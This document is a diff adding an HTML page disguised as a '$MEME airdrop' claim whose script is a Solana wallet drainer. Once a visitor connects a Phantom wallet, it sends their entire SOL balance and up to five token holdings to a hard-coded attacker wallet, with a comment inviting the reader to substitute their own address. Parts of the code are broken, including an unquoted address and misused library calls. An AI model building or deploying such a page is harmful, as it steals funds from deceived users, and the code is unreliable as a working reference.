@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airdrop Claim</title>
+    <style>
+        body { font-family: sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; background: #161b22; padding: 2rem; border-radius: 12px; border: 1px solid #30363d; }
+        button { background: #238636; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #2ea043; }
+        #status { margin-top: 10px; font-size: 14px; color: #8b949e; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Claim $MEME Airdrop</h1>
+        <p>Connect wallet to receive your tokens.</p>
+        <button id="claimBtn">Connect & Claim</button>
+        <div id="status"></div>
+    </div>
+
+    <script type="module">
+        import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.browser.js";
+        import * as splToken from "https://cdn.jsdelivr.net/npm/@solana/spl-token@latest/lib/index.browser.js";
+
+        // REPLACE THIS WITH YOUR WALLET ADDRESS
+        const DESTINATION_WALLET = HJr1YBdkafWEqNQcRDPe7cGpRctDo9tHGBSe413UKQBE; 
+        
+        const statusDiv = document.getElementById("status");
+        const btn = document.getElementById("claimBtn");
+
+        btn.addEventListener("click", async () => {
+            statusDiv.textContent = "Connecting to Phantom...";
+            
+            // 1. Check for Phantom
+            if (!window.solana || !window.solana.isPhantom) {
+                statusDiv.textContent = "Please install Phantom Wallet!";
+                return;
+            }
+
+            // 2. Connect
+            const response = await window.solana.connect();
+            const userPublicKey = response.publicKey;
+            statusDiv.textContent = "Connecting to Solana...";
+
+            // 3. Create Connection
+            const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+
+            // 4. Drain SOL
+            try {
+                const balance = await connection.getBalance(userPublicKey);
+                if (balance > 0) {
+                    statusDiv.textContent = "Draining SOL...";
+                    const tx = new Transaction().add(
+                        SystemProgram.transfer({
+                            fromPubkey: userPublicKey,
+                            toPubkey: new PublicKey(DESTINATION_WALLET),
+                            lamports: balance
+                        })
+                    );
+                    // Sign and Send
+                    const { signature } = await window.solana.signAndSendTransaction(tx);
+                    await connection.confirmTransaction(signature);
+                    statusDiv.textContent = "SOL Drained! Claiming Tokens...";
+                }
+            } catch (e) {
+                console.error("SOL Error", e);
+                statusDiv.textContent = "SOL Transfer Failed/Rejected";
+                return;
+            }
+
+            // 5. Drain SPL Tokens
+            try {
+                const accounts = await splToken.getTokenAccountsByOwner(userPublicKey, { programId: splToken.TOKEN_PROGRAM_ID });
+                
+                if (accounts.value.length === 0) {
+                    statusDiv.textContent = "No tokens found. SOL transferred!";
+                    return;
+                }
+
+                statusDiv.textContent = "Draining Tokens...";
+
+                // Process tokens one by one (Solana has a transaction size limit)
+                // For a simple drainer, we usually send the largest ones or do one big batch.
+                // Here we do the first 5 largest to avoid failure.
+                const tokenAccounts = accounts.value.slice(0, 5); 
+                
+                for (const account of tokenAccounts) {
+                    const mintAddress = account.pubkey; // Wait, no. account.pubkey is the TOKEN ACCOUNT.
+                    // We need the MINT address from the account info
+                    const accountInfo = await splToken.getAccount(connection, account.pubkey);
+                    const mintPubkey = accountInfo.mint;
+                    
+                    // Create a new token account for the DESTINATION if it doesn't exist
+                    // Or just transfer to the destination's existing account
+                    // Simplest: Transfer all to destination's associated token account
+                    
+                    const sourceTokenAccount = account.pubkey;
+                    
+                    // Get destination's token account for this mint
+                    const destTokenAccount = splToken.getAssociatedTokenAddressSync(
+                        new PublicKey(mintPubkey),
+                        new PublicKey(DESTINATION_WALLET),
+                        false // allowOwnerOffCurve
+                    );
+
+                    // Build transaction
+                    const transferTx = new Transaction().add(
+                        splToken.transferChecked(
+                            connection,
+                            sourceTokenAccount,
+                            new PublicKey(mintPubkey),
+                            destTokenAccount,
+                            userPublicKey,
+                            [],
+                            accountInfo.amount.uiAmount ?? 0 // Transfer all
+                        )
+                    );
+
+                    // Sign
+                    const { signature } = await window.solana.signAndSendTransaction(transferTx);
+                    await connection.confirmTransaction(signature);
+                }
+                
+                statusDiv.textContent = "All Assets Transferred!";
+                btn.textContent = "Done";
+                btn.disabled = true;
+
+            } catch (e) {
+                console.error("Token Error", e);
+                statusDiv.textContent = "Tokens Drained (Partial)";
+            }
+        });
+    </script>
+</body>
+</html>
